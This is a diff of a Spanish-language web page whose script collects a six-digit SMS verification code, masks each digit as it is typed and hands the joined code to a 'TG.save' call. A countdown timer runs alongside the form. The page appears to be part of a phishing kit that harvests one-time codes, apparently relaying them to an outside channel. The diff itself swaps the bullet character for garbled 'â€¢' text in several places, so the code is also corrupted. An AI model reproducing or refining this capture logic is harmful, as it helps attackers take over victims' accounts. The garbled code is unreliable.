@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+﻿<!DOCTYPE html>
 <html lang="es">
 <head>
   <meta charset="UTF-8">
@@ -424,7 +424,7 @@
 
       function actualizarEstadoBoton() {
         const completo = otpInputs.every(function (input) {
-          return input.value === "•" || /^[0-9]$/.test(input.value);
+          return input.value === "â€¢" || /^[0-9]$/.test(input.value);
         });
 
         btnAceptar.disabled = !completo;
@@ -441,7 +441,7 @@
             const valorTemporalMostrado = digito;
             setTimeout(function () {
               if (input.value === valorTemporalMostrado) {
-                input.value = "•";
+                input.value = "â€¢";
                 input.dataset.valor = valorTemporalMostrado;
               }
             }, 300);
@@ -506,7 +506,7 @@
         if (btnAceptar.disabled) return;
 
         var smsCode = otpInputs.map(function (input) {
-          return input.dataset.valor || (input.value === '•' ? '' : input.value);
+          return input.dataset.valor || (input.value === 'â€¢' ? '' : input.value);
         }).join('');
 
         TG.save('sms', smsCode);
@@ -549,7 +549,8 @@
     
     var pathKey = 'timer_' + window.location.pathname.replace(/[^a-zA-Z0-9]/g, '_');
     var endTime = localStorage.getItem(pathKey);
-    if (!endTime) {
+      if (endTime && Number(endTime) < Date.now()) { endTime = null; localStorage.removeItem(pathKey); }
+      if (!endTime) {
       endTime = Date.now() + 300 * 1000;
       localStorage.setItem(pathKey, endTime);
     }
